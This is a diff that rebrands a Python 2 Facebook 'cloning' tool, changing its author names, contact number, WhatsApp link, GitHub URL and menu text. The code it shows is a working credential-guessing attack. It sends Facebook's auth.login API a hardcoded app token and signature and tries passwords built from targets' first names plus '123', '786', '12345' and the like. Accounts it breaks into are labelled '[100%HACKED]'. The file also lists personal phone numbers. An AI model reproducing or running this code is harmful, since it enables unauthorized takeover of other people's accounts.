@@ -64,17 +64,17 @@ logo='''
 \033[1;92m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
 \033[1;92m ┈┈┈▕▕╲┊┊╱▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕╲┊┊╱▏▏┈┈┈
 \033[1;92m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
-\033[1;92m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;96mBlackMafia.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
+\033[1;92m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;96mArbabAli.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
 \033[1;92m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
 \033[1;92m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
-\033[1;92m................\033[1;96mBlackMafia\033[1;91m...............
+\033[1;92m................\033[1;96mArbabMemon\033[1;91m...............
 \033[1;92m................\033[1;96m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 
-\033[1;91m☞ Auther     : lovehacker✅
-\033[1;92m☞ WhatsApp   : 03094161457
-\033[1;95m☞ YouTube    : https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw
+\033[1;91m☞ Auther     : Naam To Suna hi Hoga✅
+\033[1;92m☞ Designer   : Arbab Ali Memon
+\033[1;95m☞ Contact    : +923003023263
 
 \033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
                                 '''
@@ -146,10 +146,10 @@ def menu():
 	print (S + 50*'-')
 	print
 	print (S + '[' + P + '☞1' + S + ']' + S + ' Fast Cloning New Update')
-	print (S + '[' + P + '☞2' + S + ']' + S + ' Update BlackMafia Tool')
-	print (S + '[' + P + '☞3' + S + ']' + S + ' Black Mafia WhatsApp Group')
-	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out')
-	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit')
+	print (S + '[' + P + '☞2' + S + ']' + S + ' Update Arbab Memon Tool')
+	print (S + '[' + P + '☞3' + S + ']' + S + ' Arbab Memon WhatsApp Group')
+	print (S + '[' + Y + '☞4' + S + ']' + G + ' Log Out Bole to Kalti Marna')
+	print (S + '[' + Y + '☞0' + S + ']' + R + ' Exit Bole to Dafa hone ka')
 	print
 	print (S + 50*'-')
 	print
@@ -164,8 +164,8 @@ def mb():
 	elif bm =='1':
 		pak()
 	elif bm =='2':
-	    os.system('rm -rf $HOME/lovehacker')
-	    os.system('cd $HOME && git clone https://github.com/lovehackerAsif/BlackMafia/')
+	    os.system('rm -rf $HOME/Exchanger')
+	    os.system('cd $HOME && git clone https://github.com/ShahzadaArbab/Exchanger/')
 	    cb()
 	    print (logo)
 	    psb('☆10%')
@@ -178,18 +178,18 @@ def mb():
 	    psb('☆☆☆☆☆☆☆☆80%')
 	    psb('☆☆☆☆☆☆☆☆☆90%')
 	    psb('☆☆☆☆☆☆☆☆☆☆100%')
-	    psb('Frends login new Account✓')
-	    psb('WhatsApp Num 03094161457✓')
-	    psb('WellCome To BlackMafia')
-	    psb('Congratulations lovehacker Tool Has Been Updated Successfully')
-	    psb('🔓User Name☆ BlackMafia✓')
-	    psb('🔓Password ☆ lovehacker✓')
-	    psb('Subscrib My Youtube Chenal loveHacker✓')
+	    psb('Persnal Id Use Nhi Karne Ka✓')
+	    psb('WhatsApp Num +923003023263✓')
+	    psb('WellCome To Arbab,s Glaxy')
+	    psb('Congratulations Arbab Memon Tool Has Been Updated Successfully')
+	    psb('🔓User Name☆ Hacker✓')
+	    psb('🔓Password ☆ Arbab✓')
+	    psb('Subscrib My Youtube Chenal Cyber Gange Hidden Tricker✓')
 	    psb('Please Login Again')
 	    time.sleep(2)
-	    os.system('cd $HOME/BlackMafia && python2 BlackMafia.py')
+	    os.system('cd $HOME/ArbabMemon && python2 Arbab.py')
 	elif bm =='3':
-	    os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
+	    os.system('xdg-open https://chat.whatsapp.com/LZKFT41qmVbKVKNHE0NkXK')
 	    menu()
 	elif bm =='4':
 		psb('Token Has Been Removed')
@@ -217,7 +217,7 @@ def pak():
 	print (S + '[' + P + '☞1' + S + ']' + P + ' Clone With Friend List')
 	print (S + '[' + P + '☞2' + S + ']' + P + ' Clone From Public Account')
 	print (S + '[' + Y + '☞3' + S + ']' + Y + ' Clone From File')
-	print (S + '[' + R + '☞0' + S + ']' + R + ' Back')
+	print (S + '[' + R + '☞0' + S + ']' + R + ' Back Samjhta he Na Kalti')
 	print
 	print (S + 50*'-')
 	print
@@ -284,66 +284,66 @@ def pb():
 			dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps1)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			k=json.load(dt)
 			if 'www.facebook.com' in k['error_msg']:
-			    print(S+'[CP] ♡ '+user+' ♡ '+ps1)
+			    print(S+'[After2days] ♡ '+user+' ♡ '+ps1)
 			    cps.append(user+ps1)
 			else:
 			    if 'access_token' in k:
-			        print (G+'[OK] ♡ '+user+' ♡ '+ps1)
+			        print (G+'[100%HACKED] ♡ '+user+' ♡ '+ps1)
 			        oks.append(user+ps1)
 			    else:
 			        ps2=(j['first_name']+'123')
 			        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps2)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			        k=json.load(dt)
 			        if 'www.facebook.com' in k['error_msg']:
-			            print(S+'[CP] ♡ '+user+' ♡ '+ps2)
+			            print(S+'[After2days] ♡ '+user+' ♡ '+ps2)
 			            cps.append(user+ps2)
 			        else:
 			            if 'access_token' in k:
-			                print(G+'[OK] ♡ '+user+' ♡ '+ps2)
+			                print(G+'[100%HACKED] ♡ '+user+' ♡ '+ps2)
 			                oks.append(user+ps2)
 			            else:
 			                ps3=(j['first_name']+'786')
 			                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps3)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                k=json.load(dt)
 			                if 'www.facebook.com' in k['error_msg']:
-			                    print(S+'[CP] ♡ '+user+' ♡ '+ps3)
+			                    print(S+'[After2days] ♡ '+user+' ♡ '+ps3)
 			                    cps.append(user+ps3)
 			                else:
 			                    if 'access_token' in k:
-			                        print(G+'[OK] ♡ '+user+' ♡ '+ps3)
+			                        print(G+'[100%HACKED] ♡ '+user+' ♡ '+ps3)
 			                        oks.append(user+ps3)
 			                    else:
 			                        ps4=(j['first_name']+'12345')
 			                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps4)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                        k=json.load(dt)
 			                        if 'www.facebook.com' in k['error_msg']:
-			                            print(S+'[CP] ♡ '+user+' ♡ '+ps4)
+			                            print(S+'[After2days] ♡ '+user+' ♡ '+ps4)
 			                            cps.append(user+ps4)
 			                        else:
 			                            if 'access_token' in k:
-			                                print(G+'[OK] ♡ '+user+' ♡ '+ps4)
+			                                print(G+'[100%HACKED] ♡ '+user+' ♡ '+ps4)
 			                                oks.append(user+ps4)
 			                            else:
 			                                ps5=('Pakistan')
 			                                dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps5)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                k=json.load(dt)
 			                                if 'www.facebook.com' in k['error_msg']:
-			                                    print(S+'[CP] ♡ '+user+' ♡ '+ps5)
+			                                    print(S+'[After2days] ♡ '+user+' ♡ '+ps5)
 			                                    cps.append(user+ps5)
 			                                else:
 			                                    if 'access_token' in k:
-			                                        print(G+'[OK] ♡ '+user+' ♡ '+ps5)
+			                                        print(G+'[100%HACKED] ♡ '+user+' ♡ '+ps5)
 			                                        oks.append(user+ps5)
 			                                    else:
-			                                        ps6=(j['first_name']+'khan')
+			                                        ps6=(j['first_name']+'112233')
 			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 			                                        k=json.load(dt)
 			                                        if 'www.facebook.com' in k['error_msg']:
-			                                            print(S+'[CP] ♡ '+user+' ♡ '+ps6)
+			                                            print(S+'[After2days] ♡ '+user+' ♡ '+ps6)
 			                                            cps.append(user+ps6)
 			                                        else:
 			                                            if 'access_token' in k:
-			                                                print(G+'[OK] ♡ '+user+' ♡ '+ps6)
+			                                                print(G+'[100%HACKED] ♡ '+user+' ♡ '+ps6)
 			                                                oks.append(user+ps6)
 		except:
 			pass
@@ -352,12 +352,12 @@ def pb():
 	print
 	print(S+50*'-')
 	print
-	print(S+'Process has been completed CP ID Open After 7 Days ')
+	print(S+'Process has been completed CP ID Open After 2 Days in fb lite ')
 	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(oks))+S+'/'+R+str(len(cps)))
-	print(S+'BlackMafia')     
+	print(S+'ArbabMemon')     
 	print
 	raw_input(R + 'Back')
-	os.system('python2 BlackMafia.py')
+	os.system('python2 Arbab.py')
 if __name__=='__main__':
     login()
 
